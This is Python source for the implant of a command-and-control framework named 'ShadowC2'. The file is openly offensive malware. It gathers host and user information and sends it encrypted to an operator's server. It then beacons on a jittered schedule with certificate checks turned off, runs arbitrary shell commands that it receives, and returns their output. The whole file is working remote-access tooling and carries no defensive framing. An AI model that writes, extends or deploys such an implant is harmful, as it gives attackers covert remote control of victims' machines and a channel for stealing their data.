"""
ShadowC2 - Agent (Implant) - Fixed Version
"""

import os
import sys
import time
import uuid
import random
import socket
import platform
import subprocess
import json
import base64
import requests
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.crypto import CryptoHandler
from common.protocol import (
    C2Message, MessageType, CheckinMessage, HeartbeatMessage,
    ResponseMessage, ProtocolConfig
)


class ShadowAgent:
    def __init__(self, c2_url, master_key):
        self.c2_url = c2_url.rstrip('/')
        self.session_id = str(uuid.uuid4())
        
        # Use master key directly (no session derivation yet)
        key_bytes = base64.b64decode(master_key)
        self.crypto = CryptoHandler(key=key_bytes)
        self.session_crypto = None  # Will be set after checkin
        
        self.beacon_interval = 60
        self.jitter = 30
        self.running = True
        
        self.system_info = self.gather_system_info()
    
    def gather_system_info(self):
        try:
            hostname = socket.gethostname()
            username = os.getenv('USERNAME') or os.getenv('USER') or 'unknown'
            os_name = platform.system()
            os_version = platform.release()
            architecture = platform.machine()
            
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
                s.close()
            except:
                ip_address = "unknown"
            
            return {
                "hostname": hostname,
                "username": username,
                "os": f"{os_name} {os_version}",
                "architecture": architecture,
                "ip_address": ip_address,
                "mac_address": "unknown",
                "domain": os.getenv('USERDOMAIN') or 'WORKGROUP',
                "privileges": "user",
                "agent_version": "1.0.0"
            }
        except Exception as e:
            return {"hostname": "unknown", "username": "unknown", "os": "unknown"}
    
    def checkin(self):
        try:
            msg = CheckinMessage(self.session_id, self.system_info)
            encrypted = self.crypto.encrypt(msg.to_dict())
            
            response = requests.post(
                f"{self.c2_url}/api/v1/checkin",
                json={"data": encrypted},
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                response_data = response.json().get('data')
                decrypted = self.crypto.decrypt(response_data)
                
                self.beacon_interval = decrypted.get('beacon_interval', 60)
                self.jitter = decrypted.get('jitter', 30)
                
                # Use same crypto for session
                self.session_crypto = self.crypto
                
                return True
            return False
        except Exception as e:
            print(f"[!] Check-in error: {e}")
            return False
    
    def beacon(self):
        try:
            msg = HeartbeatMessage(self.session_id, stats={})
            encrypted = self.session_crypto.encrypt(msg.to_dict())
            
            response = requests.post(
                f"{self.c2_url}/api/v1/beacon",
                json={"data": encrypted, "session_id": self.session_id},
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                response_data = response.json().get('data')
                decrypted = self.session_crypto.decrypt(response_data)
                commands = decrypted.get('commands', [])
                return commands
            return []
        except Exception as e:
            print(f"[!] Beacon error: {e}")
            return []
    
    def execute_command(self, command_msg):
        try:
            command_id = command_msg.get('msg_id')
            command_data = command_msg.get('data', {})
            command = command_data.get('command')
            args = command_data.get('args', [])
            
            output = ""
            success = True
            
            if command == "shell":
                cmd = ' '.join(args)
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                output = result.stdout + result.stderr
            elif command == "whoami":
                output = self.system_info.get('username', 'unknown')
            elif command == "hostname":
                output = self.system_info.get('hostname', 'unknown')
            elif command == "pwd":
                output = os.getcwd()
            elif command == "cd":
                if args:
                    try:
                        os.chdir(args[0])
                        output = f"Changed to {os.getcwd()}"
                    except Exception as e:
                        output = f"Error: {e}"
                        success = False
                else:
                    output = "No directory specified"
                    success = False
            elif command == "ls":
                path = args[0] if args else '.'
                try:
                    files = os.listdir(path)
                    output = '\n'.join(files)
                except Exception as e:
                    output = f"Error: {e}"
                    success = False
            elif command == "sysinfo":
                output = json.dumps(self.system_info, indent=2)
            elif command == "sleep":
                if args:
                    try:
                        self.beacon_interval = int(args[0])
                        output = f"Beacon interval: {self.beacon_interval}s"
                    except:
                        output = "Invalid interval"
                        success = False
            elif command == "exit":
                output = "Terminating..."
                self.running = False
            else:
                output = f"Unknown command: {command}"
                success = False
            
            return ResponseMessage(
                session_id=self.session_id,
                command_id=command_id,
                success=success,
                output=output
            )
        except Exception as e:
            return ResponseMessage(
                session_id=self.session_id,
                command_id=command_msg.get('msg_id', 'unknown'),
                success=False,
                output="",
                error=str(e)
            )
    
    def send_response(self, response_msg):
        try:
            encrypted = self.session_crypto.encrypt(response_msg.to_dict())
            requests.post(
                f"{self.c2_url}/api/v1/response",
                json={"data": encrypted, "session_id": self.session_id},
                verify=False,
                timeout=10
            )
        except Exception as e:
            print(f"[!] Response error: {e}")
    
    def calculate_sleep(self):
        jitter_amount = random.randint(-self.jitter, self.jitter)
        return max(1, self.beacon_interval + jitter_amount)
    
    def run(self):
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        print(f"[*] ShadowC2 Agent starting...")
        print(f"[*] Session ID: {self.session_id}")
        print(f"[*] C2 Server: {self.c2_url}")
        print(f"[*] Performing initial check-in...")
        
        retries = 0
        while retries < 5:
            if self.checkin():
                print(f"[+] Check-in successful!")
                break
            else:
                retries += 1
                print(f"[!] Check-in failed, retry {retries}/5...")
                time.sleep(5)
        
        if retries >= 5:
            print(f"[!] Failed to check in. Exiting.")
            return
        
        print(f"[*] Beacon interval: {self.beacon_interval}s, jitter: ±{self.jitter}s")
        
        while self.running:
            try:
                commands = self.beacon()
                for cmd in commands:
                    print(f"[*] Executing: {cmd.get('data', {}).get('command')}")
                    response = self.execute_command(cmd)
                    self.send_response(response)
                
                time.sleep(self.calculate_sleep())
            except KeyboardInterrupt:
                print(f"\n[!] Agent terminated")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(30)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='ShadowC2 Agent')
    parser.add_argument('--server', required=True)
    parser.add_argument('--key', required=True)
    args = parser.parse_args()
    
    agent = ShadowAgent(args.server, args.key)
    agent.run()
